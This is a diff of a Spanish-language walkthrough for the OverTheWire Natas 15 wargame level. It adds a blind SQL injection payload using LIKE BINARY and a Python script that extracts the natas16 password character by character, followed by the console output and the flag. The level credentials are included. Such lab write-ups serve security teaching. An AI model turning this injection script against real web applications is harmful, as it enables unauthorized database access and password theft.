@@ -109,7 +109,7 @@ Mejor que esté bien o mal, vamos a optar por indicarle si la contraseña **cont
 Para eso utilizaremos la opción de sql **LIKE BINARY** que nos indica si una cadena de caracteres específica coincide con un patrón especificado. En este casi si la contraseña empieza con el valor **a**
 
 ```php
-natas16" AND password LIKE BINARY "a%" "
+natas16" AND password LIKE BINARY "a%";# "
 ```
 
 - Si la respuesta es **This user exists** significa que la contraseña del usuario **natas16** empieza por **a.........**
@@ -122,18 +122,76 @@ Sabemos que tenemos que conseguir una contraseña de **32 caracteres** de longit
 Lo llamaremos **BlindNatas15Injector.py**
 
 ```python
+import httplib2
+import urllib
+
+ 
+h = httplib2.Http()
+h.add_credentials('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+ 
+passTemporal     = "";
+letras           = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+posicion = 0
+
+while posicion < len(letras):
+        query = urllib.urlencode(dict(username="natas16\" AND password LIKE BINARY \"" + passTemporal + letras[posicion] + "%\" ;# "))
+        resp, contenido = h.request("http://natas15.natas.labs.overthewire.org/index.php?" + query, method="POST")
+        if ("This user exist" in str(contenido)):
+                passTemporal += letras[posicion];
+                print("Nueva password encontrada: " + passTemporal)
+                posicion = 0
+                if (len(passTemporal)==32):
+                        break;
+                continue
+        posicion += 1
+
+print "-"*70
+print "Password Natas16 = {0}".format(passTemporal)
+print "-"*70
 ```
 
+Ejecutamos el script y vamos viendo por la consola como van apareciendo los caracteres que han coincidido con las letras que tiene la contraseña. Tenemos que esperar hasta que la longitud sea de **32**
 
-```php
+```bash
+ikerburguera@MacBook-Pro-de-Iker:~/Desktop$ python blindNatas15Injector.py 
+Nueva password encontrada: W
+Nueva password encontrada: Wa
+Nueva password encontrada: WaI
+Nueva password encontrada: WaIH
+Nueva password encontrada: WaIHE
+Nueva password encontrada: WaIHEa
+Nueva password encontrada: WaIHEac
+Nueva password encontrada: WaIHEacj
+Nueva password encontrada: WaIHEacj6
+Nueva password encontrada: WaIHEacj63
+Nueva password encontrada: WaIHEacj63w
+Nueva password encontrada: WaIHEacj63wn
+Nueva password encontrada: WaIHEacj63wnN
+Nueva password encontrada: WaIHEacj63wnNI
+Nueva password encontrada: WaIHEacj63wnNIB
+Nueva password encontrada: WaIHEacj63wnNIBR
+Nueva password encontrada: WaIHEacj63wnNIBRO
+Nueva password encontrada: WaIHEacj63wnNIBROH
+Nueva password encontrada: WaIHEacj63wnNIBROHe
+Nueva password encontrada: WaIHEacj63wnNIBROHeq
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0m
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0m5
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0m5n
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0m5nh
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0m5nhm
+Nueva password encontrada: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+-------------------------------------------------------------------
+Password Natas16 = WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+-------------------------------------------------------------------
+```
 
-
-
-
-
-
-
-natas16" AND password LIKE BINARY "W%" "
+**FLAG** = {WaIHEacj63wnNIBROHeqi3p9t0m5nhmh}
 
 
 
